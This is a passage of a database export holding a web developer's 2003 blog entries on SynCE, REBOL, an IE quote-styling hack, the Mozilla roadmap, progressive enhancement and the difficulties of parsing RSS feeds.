		<field name="body">&lt;p&gt;I'm playing around with a borrowed Compaq iPAQ at the moment. Unfortunately I don't have permission to go the whole hog and &lt;a href=&quot;http://www.handhelds.org/&quot; title=&quot;Everything you could want to know about Linux on handhelds&quot;&gt;install linux on it&lt;/a&gt; but, as the next best thing, I've been working out how to get it to talk to my Linux box. A quick Google search brought up &lt;a href=&quot;http://synce.sourceforge.net/synce/&quot;&gt;SynCE&lt;/a&gt;, an open source project providing all kinds of software to allow communication between *nix and handhelds running Pocket PC. So far I've got the command line tools working which allow me to transfer files to and from the iPAQ and start up iPAQ programs remotely. The next step is &lt;a href=&quot;http://synce.sourceforge.net/synce/multisync.php&quot; title=&quot;SynCE - Using MultiSync for synchronization&quot;&gt;synchronisation with Evolution&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-03-31 23:27:36</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">859</field>
		<field name="title">Playing with REBOL</field>
		<field name="slug">playingWithRebol</field>
		<field name="body">&lt;p&gt;Yesterday, inspired by &lt;a href=&quot;http://www.keithdevens.com/programming/&quot;&gt;Keith's Programming page&lt;/a&gt;, I decided to take a look at &lt;a href=&quot;http://www.rebol.com/&quot;&gt;REBOL&lt;/a&gt;. &lt;acronym title=&quot;Relative Expresion Based Object Language&quot;&gt;REBOL&lt;/acronym&gt; is a very high level scripting language designed for working with the internet. It has the interbnet built in to its very core - its 45 core datatypes include email addresses and &lt;acronym title=&quot;Uniform Resource Indicators&quot;&gt;URI&lt;/acronym&gt;s and it includes support for 14 standard protocols including &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt;, &lt;acronym title=&quot;File Transfer Protocol&quot;&gt;FTP&lt;/acronym&gt;, &lt;acronym title=&quot;Post Office Protocol&quot;&gt;POP&lt;/acronym&gt; and even finger.&lt;/p&gt;

&lt;p&gt;The language itself is impressively expressive. A classic example is the following one-liner, which retrieves the contents of a web page and emails it to a specified address:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;send fred@example.com read http://www.rebol.com/&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;While the core of &lt;acronym title=&quot;Relative Expresion Based Object Language&quot;&gt;REBOL&lt;/acronym&gt; is closed source (and looks set to remain that way) implementations are available for 40 different platforms and the language has an developed a large community. I've hardly scratched the surface of the capabilities of the language - the &lt;acronym title=&quot;Graphical User Interface&quot;&gt;GUI&lt;/acronym&gt; stuff in particular is very impressive. Also worth a look is &lt;a href=&quot;http://www.alistapart.com/stories/simplecontentmanagement/&quot;&gt;Simple Content Management&lt;/a&gt; on &lt;acronym title=&quot;A List Apart&quot;&gt;ALA&lt;/acronym&gt;, which demonstrates how &lt;acronym title=&quot;Relative Expresion Based Object Language&quot;&gt;REBOL&lt;/acronym&gt; can be used to construct a simple, template based offline content management system.&lt;/p&gt;</field>
		<field name="created">2003-03-31 23:42:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">860</field>
		<field name="title">getElementsByClassName() rewritten</field>
		<field name="slug">getElementsByClassNameRewritte</field>
		<field name="body">&lt;p&gt;Andy has &lt;a href=&quot;http://blog.mooncalf.me.uk/archive/2003/03/31#MoreClassCalling&quot; title=&quot;More Class Calling&quot;&gt;rewritten&lt;/a&gt; &lt;code&gt;getElementsByClassName&lt;/code&gt;, resulting in much cleaner code and a method which can be called on any &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; element, not just the document object.&lt;/p&gt;</field>
		<field name="created">2003-03-31 23:46:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">861</field>
		<field name="title">Glastonbury sold out</field>
		<field name="slug">glastonburySoldOut</field>
		<field name="body">&lt;p&gt;Bloody hell - &lt;a href=&quot;http://www.efestivals.co.uk/news/030401a.shtml&quot;&gt;Glastonbury 2003 has sold out&lt;/a&gt; within just 24 hours of tickets going on sale! My first thought was that this must be an April Fool's thing, but it seems extremely unlikely considering that Glasto fans are already being driven to paying double the price of the ticket from ticket touts (if it is a joke, it's gone &lt;em&gt;horribly&lt;/em&gt; wrong). Luckily the main group of friends I'm going with all got there in time, but any hopes I had of convincing other friends to go are well and truly squashed.&lt;/p&gt;

&lt;p&gt;From the number of Glasto tickets already selling on Ebay, it looks like this is going to be the year the festival was nearly ruined by the touts :/&lt;/p&gt;</field>
		<field name="created">2003-04-01 12:58:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">862</field>
		<field name="title">Tables are the new black</field>
		<field name="slug">tablesAreTheNewBlack</field>
		<field name="body">&lt;p&gt;Gotta dig Sam's &lt;a href=&quot;http://radio.weblogs.com/0101679/index.html&quot;&gt;retro redesign&lt;/a&gt;, nested tables galore ;)&lt;/p&gt;</field>
		<field name="created">2003-04-01 13:01:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">863</field>
		<field name="title">Fooling no one</field>
		<field name="slug">foolingNoOne</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.brunningonline.net/simon/blog/archives/000682.html#000682&quot; title=&quot;In the spirit of the day...&quot;&gt;Simon Brunning&lt;/a&gt;, the &lt;a href=&quot;http://www.museumofhoaxes.com/top100.html&quot;&gt;Top 100 April Fool's Day Hoaxes of All Time&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;April Fool's day online hasn't been quite as much fun this year (call me sad but I enjoy a good April Fool's gag) thanks no doubt to people's sense of humour being dampened by the war. Still, &lt;a href=&quot;http://www.cpan.org/&quot; title=&quot;A tribute to Matt&amp;apos;s Script Archive?&quot;&gt;CPAN&lt;/a&gt; and &lt;a href=&quot;http://www.metafilter.com/&quot; title=&quot;Apparently they&amp;apos;ve been taken over by Google&quot;&gt;MetaFilter&lt;/a&gt; put on a good show. Disturbingly, I just flicked on the &lt;acronym title=&quot;TeleVision&quot;&gt;TV&lt;/acronym&gt; and caught Anne Robinson being &lt;em&gt;nice&lt;/em&gt; to people on the Weakest Link. Maybe it's a good thing April Fool's only comes one a year ;)&lt;/p&gt;</field>
		<field name="created">2003-04-01 17:33:11</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">864</field>
		<field name="title">The power of Javascript</field>
		<field name="slug">javascriptPower</field>
		<field name="body">&lt;p&gt;Spotted on &lt;a href=&quot;http://www.paranoidfish.org/links/2003/03/&quot;&gt;paranoidfish.org/links&lt;/a&gt;, &lt;a href=&quot;http://www.crockford.com/javascript/javascript.html&quot;&gt;JavaScript: The World's Most Misunderstood Programming Language&lt;/a&gt; dispells some myths about Javascript and shows how it is actually a very powerful and expressive language. The comparisons made to Lisp are particularly interesting.&lt;/p&gt;

&lt;p&gt;Stuart spotted this one too. In &lt;a href=&quot;http://www.kryogenix.org/days/459.html&quot;&gt;The Power of JavaScript&lt;/a&gt; he waxes lyrical about the untapped potential of JavaScript and the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; in web applications. While I agree that remote scripting is a vastly under-used technique, I'm cautious to get too excited about Javaccript enhanced web application interfaces having seen &lt;a href=&quot;http://mpt.phrasewise.com/&quot;&gt;Matthew Thomas&lt;/a&gt; rant about their usability implications at every available opportunity...&lt;/p&gt;

&lt;p&gt;From the same site as the Javascript article: &lt;a href=&quot;http://www.crockford.com/javascript/lint.html&quot;&gt;jslint&lt;/a&gt;, a utility for checking Javascript for common programming errors and evidence of bad coding practise.&lt;/p&gt;</field>
		<field name="created">2003-04-02 23:51:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">865</field>
		<field name="title">Mozilla changes focus</field>
		<field name="slug">mozillaChangesFocus</field>
		<field name="body">&lt;p&gt;The Mozilla project is shifting focus to concentrate more on standalone apps such as Phoenix and Minotaur. &lt;em&gt;Cool&lt;/em&gt;. The full story can be &lt;a href=&quot;http://www.mozillazine.org/articles/article3042.html&quot; title=&quot;Major Roadmap Update Centers Around Phoenix, Thunderbird; 1.4 Branch to Replace 1.0; Changes Planned for Module Ownership Model&quot;&gt;found on MozillaZine&lt;/a&gt;, with further details on the &lt;a href=&quot;http://www.mozilla.org/roadmap.html&quot;&gt;Mozilla.org Roadmap&lt;/a&gt;. See also comments from &lt;a href=&quot;http://www.deftone.com/blogzilla/archives/mozillaorg_shifts_focus_to_phoenix_minotaur.html&quot; title=&quot;Mozilla.org Shifts Focus to Phoenix, Minotaur&quot;&gt;Blogzilla&lt;/a&gt; and &lt;a href=&quot;http://mpt.phrasewise.com/2003/04/03#a492&quot; title=&quot;Mozilla to be replaced by standalone browser and mail client&quot;&gt;mpt&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-04-02 23:56:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">866</field>
		<field name="title">Fixing quotes with Javascript</field>
		<field name="slug">fixingQuotesWithJavascript</field>
		<field name="body">&lt;p&gt;Marek Prokop has &lt;a href=&quot;http://www.sovavsiti.cz/css/abbr.html&quot; title=&quot;Styling &amp;lt;abbr&amp;gt; in IE&quot;&gt;a cunning way&lt;/a&gt; of getting Internet Explorer to style &lt;code&gt;&amp;lt;abbr&amp;gt;&lt;/code&gt; elements (&lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;, for reasons unknown, usually ignores their existence both as stylable elements and through the &lt;acronym title=&quot;Document Object model&quot;&gt;DOM&lt;/acronym&gt;). A &lt;a href=&quot;http://diveintomark.org/archives/2003/04/01/in_brief_1_april_2003.html#c000968&quot; title=&quot;Comment attached to &amp;quot;In brief: 1 April 2003&amp;quot;&quot;&gt;comment&lt;/a&gt; by Mr. Farlops on diveintomark inspired me to have a go at fixing &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;'s equally faulty quotes behaviour using javascript. Rather than detecting &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; by checking for the presence of &lt;code&gt;document.all&lt;/code&gt;, I decided to use a Microsoft specific proprietary extension: &lt;a href=&quot;http://msdn.microsoft.com/workshop/author/behaviors/overview.asp&quot; title=&quot;Introduction to DHTML Behaviors&quot;&gt;DHTML Behaviors&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The &lt;acronym title=&quot;HyperText markup language Component&quot;&gt;HTC&lt;/acronym&gt; file (&lt;a href=&quot;http://simon.incutio.com/js/fixquotes.htc&quot;&gt;&lt;code&gt;fixquotes.htc&lt;/code&gt;&lt;/a&gt;)looks like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;public:attach event=&quot;oncontentready&quot; onevent=&quot;init();&quot; /&amp;gt;
&amp;lt;script&amp;gt;
function init() {
  element.innerHTML = '&amp;amp;#8220;'+element.innerHTML+'&amp;amp;#8221;';
}
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The additional CSS required to use it (and to make quotes look pretty in better browsers), based on Mark Pilgrim's code from &lt;a href=&quot;http://diveintomark.org/archives/2002/05/04/the_q_tag.html&quot;&gt;The Q tag&lt;/a&gt;, looks like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;q {
  behavior: url(fixquotes.htc);
  quotes: '\201C' '\201D' '\2018' '\2019';
}
q:before {
  content: open-quote;
}
q:after {
  content: close-quote;
}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There are two main disadvantages to this solution: It introduces an invalid property to your &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;, and it could result in duplicated quotes in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 7 should that browser finally fix the lack of quote element support.&lt;/p&gt;

&lt;p&gt;Mark Pilgrim advocates using a server side script to mark up quotations with the relevant &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; entities. I'm not too keen on this solution purely because I tend to surf the web using Lynx 2.7 from University every now and then, and Lynx 2.7 displays some entities untranslated resulting in sites looking like this:&lt;/p&gt;

&lt;blockquote cite=&quot;http://diveintomark.org/archives/2003/04/01/in_brief_1_april_2003.html&quot;&gt;&lt;pre&gt;
   The guy in charge of &amp;amp;#8220;doing techie stuff for The Register&amp;amp;#8221;
   emailed me today to say that The Register is now sporting a shiny new
   RSS 1.0 feed. It validates and everything. Woohoo! Guess I&amp;amp;#8217;ll
   have to find somebody else to pick on now. [winking face]
&lt;/pre&gt;&lt;/blockquote&gt;

&lt;p&gt;(This issue is fixed in Lynx 2.8).&lt;/p&gt;

&lt;p&gt;&lt;q cite=&quot;http://www.rsc.co.uk/zebidee/history.htm&quot;&gt;Time for bed&lt;/q&gt;, said Zebedee.&lt;/p&gt;</field>
		<field name="created">2003-04-03 16:05:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">867</field>
		<field name="title">css-discuss archives back online</field>
		<field name="slug">cssDiscussArchivesBackOnline</field>
		<field name="body">&lt;p&gt;After several months spent offline, the &lt;a href=&quot;http://archivist.incutio.com/viewlist/css-discuss/&quot;&gt;css-discuss archives&lt;/a&gt; are back and better than ever thanks to the hard work of my colleagues at &lt;a href=&quot;http://www.incutio.com/&quot;&gt;Incutio&lt;/a&gt;. As well as updating the archives with all of the missing posts from the past few months they've improved the &lt;acronym title=&quot;Uniform Resource Locator&quot;&gt;URL&lt;/acronym&gt; scheme to make things more search engine friendly (hopefully Google will start indexing the archives now).&lt;/p&gt;</field>
		<field name="created">2003-04-03 16:10:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">868</field>
		<field name="title">Three column layouts in CSS</field>
		<field name="slug">threeColumnLayouts</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://css-discuss.incutio.com/?page=ThreeColumnLayouts&quot;&gt;ThreeColumnLayouts&lt;/a&gt; in the &lt;a href=&quot;http://css-discuss.incutio.com/&quot;&gt;css-discuss Wiki&lt;/a&gt; currently lists 24 freely available three column &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; layout templates.&lt;/p&gt;</field>
		<field name="created">2003-04-03 16:13:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">869</field>
		<field name="title">Better DHTML navigation</field>
		<field name="slug">betterDynamicNavigation</field>
		<field name="body">&lt;p&gt;Adrian Holovaty demonstrates how standards compliant code and effectively written javascript can &lt;em&gt;decimate&lt;/em&gt; the size of a clunky navigation interface, and make it more usable and accessible to boot: &lt;a href=&quot;http://www.holovaty.com/blog/archive/2003/04/03/0229&quot;&gt;Web standards improve 2theadvocate.com navigation&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-04-03 17:38:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">870</field>
		<field name="title">New favicon</field>
		<field name="slug">faviconAdded</field>
		<field name="body">&lt;p&gt;This site now sports a funky favicon, care of &lt;a href=&quot;http://www.natbat.co.uk/&quot;&gt;Nat&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-04-03 18:43:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">871</field>
		<field name="title">Closures and continuations</field>
		<field name="slug">closuresAndContinuations</field>
		<field name="body">&lt;p&gt;Thanks to Dan Sugalski (designer of &lt;a href=&quot;http://www.parrotcode.org/&quot;&gt;Parrot&lt;/a&gt;, the next generation Perl &lt;acronym title=&quot;Virtual Machine&quot;&gt;VM&lt;/acronym&gt;) I finally understand what continuations and closures actually are. He explains them as part of a comparison between the forthcoming Parrot and two popular virtual machines already in existence:&lt;/p&gt;

&lt;ol&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.sidhe.org/~dan/blog/archives/000151.html&quot;&gt;(Perl|python|Ruby) on (.NET|JVM)&lt;/a&gt; leads in to the explanation.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.sidhe.org/~dan/blog/archives/000152.html&quot;&gt;The reason for Parrot, part 2&lt;/a&gt; explains closures.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.sidhe.org/~dan/blog/archives/000156.html&quot;&gt;Continuations and VMs&lt;/a&gt; explains continuations.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.sidhe.org/~dan/blog/archives/000157.html&quot;&gt;Continuations and VMs, part 2&lt;/a&gt; rounds things off by explaining why the &lt;acronym title=&quot;Java Virtual Machine&quot;&gt;JVM&lt;/acronym&gt; and the &lt;acronym title=&quot;Common Language Runtime&quot;&gt;CLR&lt;/acronym&gt; are unsuitable environments for supporting these language features.&lt;/li&gt;
&lt;/ol&gt;</field>
		<field name="created">2003-04-03 18:56:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">872</field>
		<field name="title">Lively discussion on SOAP</field>
		<field name="slug">livelyDiscussionOnSoap</field>
		<field name="body">&lt;p&gt;If you get the basic idea of web services but are still looking to get your head around &lt;acronym title=&quot;Simple Object Access Protocol&quot;&gt;SOAP&lt;/acronym&gt; (I know I am) the &lt;a href=&quot;http://www.intertwingly.net/blog/1312.html&quot; title=&quot;Bruce Eckel said SOAP sucks?&quot;&gt;lively discussion&lt;/a&gt; currently taking place in Sam Ruby's comment section looks like a great place to start.&lt;/p&gt;</field>
		<field name="created">2003-04-04 14:54:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">873</field>
		<field name="title">Interview with Steve Champeon</field>
		<field name="slug">interviewWithSteveChampeon</field>
		<field name="body">&lt;p&gt;Meet The Makers are carrying a &lt;a href=&quot;http://www.meet-the-makers.com/conversations/champeon/&quot; title=&quot;A Conversation With Steve Champeon&quot;&gt;great interview with Steve Champeon&lt;/a&gt;, author, web standards advocate and founder of the &lt;a href=&quot;http://www.webdesign-l.com/&quot;&gt;Webdesign-L&lt;/a&gt; mailing list (which I re-subscribed to today). Steve's explanation of the concept of &quot;progressive enhancement&quot; is particularly interesting:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.meet-the-makers.com/conversations/champeon/&quot;&gt;&lt;p&gt;
The idea is to separate not only the structure from its presentation, but also make distinctions between what content needs to be arranged in what way for lowest common denominator browsers, and how to build on that structure, adding more features for those browsers that can handle them. It's basically just taking the idea of a &quot;target browser&quot; and throwing it away, and taking the idea of &quot;graceful degradation&quot; and standing it on its head. We're trying to make sure we build sites that not only work okay everywhere, they're designed to work everywhere before they do fancy things in modern graphical desktop browsers. It's too common to build sites that work &quot;right&quot; in IE/Win and work &quot;acceptably poorly&quot; everywhere else. I think it's ridiculous, it's lazy, and it's not that much more work to do it right.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;The concept is expanded upon in Steve's recent presentation &lt;a href=&quot;http://www.hesketh.com/presentations/sxsw/2003/&quot;&gt;Inclusive Web Design For the Future&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-04-04 15:14:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">874</field>
		<field name="title">Bjørn Borud blogs</field>
		<field name="slug">bjornBorudBlogs</field>
		<field name="body">&lt;p&gt;Bjørn Borud (a Senior Software Engineer at &lt;a href=&quot;http://www.alltheweb.com/&quot;&gt;AllTheWeb&lt;/a&gt;) has recently started blogging. His &lt;a href=&quot;http://borud.no/blog/?entry=26&quot; title=&quot;On finally realizing what bothers me about wiki systems&quot;&gt;thoughts on wikis&lt;/a&gt; make interesting reading. I also rather liked his description of something he calls the &quot;Hansel und Gretel&quot; mode of browsing:&lt;/p&gt;

&lt;blockquote cite=&quot;http://borud.no/blog/?entry=26&quot;&gt;&lt;p&gt;If you have ever watched someone browse for information you'll notice how they are really afraid of not finding their way back. They'll find an interesting page, they want to hold on to it, but they also want to explore its out-links -- so they open up more windows with the out-links. I call this &quot;The Hansel und Gretel mode of browsing&quot; because these people leave a trail of breadcrumbs in the form of open browser windows to find their way back. (Sometimes experiencing that their breadcrumbs are eaten by the gremlins that make browsers crash).&lt;/p&gt;

&lt;p&gt;People who have developed an understanding for how the back button works (yes, a lot of people do not understand the semantics of the back button) often seem to employ a different strategy. Their browsing looks like a depth-first traversal of a tree -- always making sure that they can use the back button to find their way back. Occasionally bookmarking a page or opening a new page for later perusal, but always preserving the history stack in a state that ensures that they can traverse the link structure sensibly. &lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I can really identify with the above. I open links in new tabs far more often than following them normally, partly because having them load in the background means I'm never left waiting for something to load but mainly because I've never felt comfortable using the back button for some reason. Browser crashes, when they do happen, can be extremely disorientating.&lt;/p&gt;</field>
		<field name="created">2003-04-04 18:53:18</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">875</field>
		<field name="title">PhotoPal</field>
		<field name="slug">photoPal</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.noeljackson.com/code/photopal/&quot;&gt;PhotoPal&lt;/a&gt; is a new &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; image gallery system by Noel Jackson inspired by the &lt;a href=&quot;http://www.textism.com/photos/&quot;&gt;Photos section&lt;/a&gt; on Textism. The way it is implemented reminds me somewhat of the &lt;a href=&quot;http://www.raelity.org/apps/blosxom/index.shtml#philosophy&quot;&gt;Blosxom philosophy&lt;/a&gt; - the album's structures is defined by the directory structure, with simple text files adding additional descriptions, and metadata is extracted from the photos themselves using PHP's &lt;a href=&quot;http://www.php.net/manual/en/function.exif-read-data.php&quot;&gt;&lt;code&gt;exif_read_data()&lt;/code&gt;&lt;/a&gt; function.&lt;/p&gt;</field>
		<field name="created">2003-04-04 19:03:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">876</field>
		<field name="title">The blogging MP</field>
		<field name="slug">theBloggingMP</field>
		<field name="body">&lt;p&gt;Could &lt;a href=&quot;http://www.tom-watson.co.uk/&quot;&gt;Tom Watson&lt;/a&gt; be the blogging world's best kept secret? He's the Labour &lt;acronym title=&quot;Member of Parliament&quot;&gt;MP&lt;/acronym&gt; for west Bromich East, he's been blogging apparently since since July 2001 and posts updates several times a day, including an almost daily &quot;Today in parliament&quot; entry. I'm surprised I haven't seen him linked to by someone before. I wander if any other &lt;acronym title=&quot;United Kingdom&quot;&gt;UK&lt;/acronym&gt; &lt;acronym title=&quot;Member of Parliament&quot;&gt;MP&lt;/acronym&gt;s have frequently updated blogs?&lt;/p&gt;</field>
		<field name="created">2003-04-04 19:53:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">877</field>
		<field name="title">Letting off some steam</field>
		<field name="slug">lettingOffSomeSteam</field>
		<field name="body">&lt;p&gt;I spent most of today knee deep in &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt;, writing an aggregator for a project at &lt;a href=&quot;http://www.incutio.com/&quot; title=&quot;Incutio Ltd&quot;&gt;work&lt;/a&gt;.  It has been quickly becomng apparent that &quot;Really Simple Syndication&quot; is anything but! There are currently three major (and goodness knows how many minor) specifications doing the rounds, and the majority of feeds seem to pick and chose between the three at will. Even the three core elements that describe an item (title, link and description) are both optional and heavily overloaded.&lt;/p&gt;

&lt;p&gt;Consider, for example, the seemingly simple task of extracting the &lt;acronym title=&quot;Uniform Resource Locator&quot;&gt;URL&lt;/acronym&gt; of an item. All three specifications define a &lt;code&gt;&amp;lt;link&amp;gt;&lt;/code&gt; element for this, but RSS 2.0 introduces &lt;a href=&quot;http://feeds.archive.org/validator/docs/rss2.html#ltguidgtSubelementOfLtitemgt&quot;&gt;guid&lt;/a&gt; which can also be used to define a permalink (unless its &lt;code&gt;isPermaLink&lt;/code&gt; attribute is set to false). The &lt;a href=&quot;http://www.scripting.com/rss.xml&quot;&gt;Scripting News RSS Feed&lt;/a&gt; provides a guid rather than a link, and some Radio Userland feeds provide both but leave the link element blank. Introduce the ongoing discussion on &lt;a href=&quot;http://www.intertwingly.net/blog/1314.html&quot; title=&quot;Again with the relative URLs&quot;&gt;how relative URLs should be resolved&lt;/a&gt; and things get even nastier.&lt;/p&gt;

&lt;p&gt;Next up, extracting the actual content of an entry. Traditionally, this occurs as an &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; entity encoded string in the &lt;code&gt;description&lt;/code&gt; element. Recently however a new element, &lt;code&gt;content:encoded&lt;/code&gt;, has started to become fashionable (this uses a CDATA section). Even more recently, &lt;a href=&quot;http://www.intertwingly.net/blog/1299.html&quot; title=&quot;xhtml in rss 2.0&quot;&gt;&lt;code&gt;xhtml:body&lt;/code&gt;&lt;/a&gt; has started gaining ground which uses namespaces to embed unencoded &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt;, making event based parsing of content that much more difficult...&lt;/p&gt;

&lt;p&gt;The aggregator I'm building is similar in style to &lt;a href=&quot;http://spycyroll.sourceforge.net/&quot;&gt;Spycyroll&lt;/a&gt;, and as such needs to know the date that an entry was posted. On this point the specifications start to differ dramatically: RSS 2.0 uses &lt;code&gt;pubDate&lt;/code&gt;, while RSS 1.0 relies on the Dublin Core element &lt;code&gt;dc:date&lt;/code&gt;. In the wild this gets &lt;em&gt;really&lt;/em&gt; messy - in a survey of the feeds linked to by &lt;a href=&quot;http://mechanicalcat.net/pyblagg.html&quot;&gt;Python Programmer Weblogs&lt;/a&gt; I found no less than 5 subtly (and not to subtly) different ways of representing dates. Here are some examples I picked up:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;pubDate&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
 &lt;li&gt;2003-03-21T16:28:40&lt;/li&gt;
 &lt;li&gt;2003-04-03T07:45:57-08:00&lt;/li&gt;
 &lt;li&gt;Fri, 04 Apr 2003 05:04:39 GMT&lt;/li&gt;
 &lt;li&gt;Fri, 28 Mar 2003 05:18:59 -0800&lt;/li&gt;
 &lt;li&gt;1049379042.0&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;dc:date&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
 &lt;li&gt;2003-03-21T16:28:40&lt;/li&gt;
 &lt;li&gt;2003-01-17T13:03:00+00:00&lt;/li&gt;
 &lt;li&gt;2003-03-27T19:41:49-06:00&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Having battled through that lot, the conscientious aggregator writer hits the next big hurdle: Approximately 10% of &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; feeds are badly formed &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt;! This issue is covered by Mark Pilgrim in &lt;a href=&quot;http://www.xml.com/pub/a/2003/01/22/dive-into-xml.html&quot;&gt;Parsing RSS at all costs&lt;/a&gt; where he presents an ultra liberal Python &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; parser which uses Python's relatively forgiving &lt;code&gt;sgmllib&lt;/code&gt; module. Great, except &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; doesn't have one of those... enter &lt;a href=&quot;http://www.cs.sfu.ca/~cameron/REX.html&quot;&gt;REX&lt;/a&gt;, a technique for &quot;shallow parsing&quot; of &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; using regular expressions (no, it's not as cludgy as it sounds - in fact Python's &lt;code&gt;sgmllib&lt;/code&gt; module is built on the same principles). Martin Spernau has an &lt;a href=&quot;http://traumwind.de/computer/php/REX/index.html&quot; title=&quot;REX in PHP, Intro&quot;&gt;excellent article&lt;/a&gt; showing how REX can be implemented in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; and demonstrates the technique in a &lt;a href=&quot;http://traumwind.tierpfad.de/blog/magpie/magpie_alike.php&quot; title=&quot;MagpieRSS with REX parser&quot;&gt;modified version&lt;/a&gt; of the MagpieRSS library. Of course, XML purists (with very good reason) advocate ignoring badly formed feeds but as Mark &lt;a href=&quot;http://www.xml.com/pub/a/2003/01/22/dive-into-xml.html&quot; title=&quot;Parsing RSS At All Costs: The Heretical Solution&quot;&gt;points out&lt;/a&gt;, this really isn't a very practical approach.&lt;/p&gt;

&lt;p&gt;So what have I done? For the moment, I've gone with the path of least resistance. &lt;a href=&quot;http://www.readinged.com/onyx/rss/&quot;&gt;Onyx RSS&lt;/a&gt; is a well designed parser based on PHP's XML support (so no invalid feed support) which works just fine for the moment. Unfortunately it is licensed under the &lt;acronym title=&quot;GNU General Public License&quot;&gt;GPL&lt;/acronym&gt;, and since this is likely to end up as a commercial project I'll have to find something else for the final cut - or more likely implement something from scratch that uses REX.&lt;/p&gt;

&lt;p&gt;Further reading:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.hebig.org/linkblog/archives/000798.html&quot;&gt;RSS Parsing in PHP&lt;/a&gt; - the blog entry that got me started.&lt;/li&gt;
 &lt;li&gt;Mark's &lt;a href=&quot;http://diveintomark.org/projects/rss_parser/index.html&quot;&gt;Ultra Liberal RSS Parser&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://diveintomark.org/archives/2002/06/02/important_change_to_the_link_tag.html&quot;&gt;RSS Auto Discovery&lt;/a&gt; - one of the few things in the RSS world that appears to be a stationary target.&lt;/li&gt;
 &lt;li&gt;The &lt;a href=&quot;http://backend.userland.com/rss&quot;&gt;RSS 2.0 Specification&lt;/a&gt; (&lt;a href=&quot;http://feeds.archive.org/validator/docs/rss2.html&quot; title=&quot;RSS 2.0 Specification&quot;&gt;mirrored here&lt;/a&gt;).&lt;/li&gt;
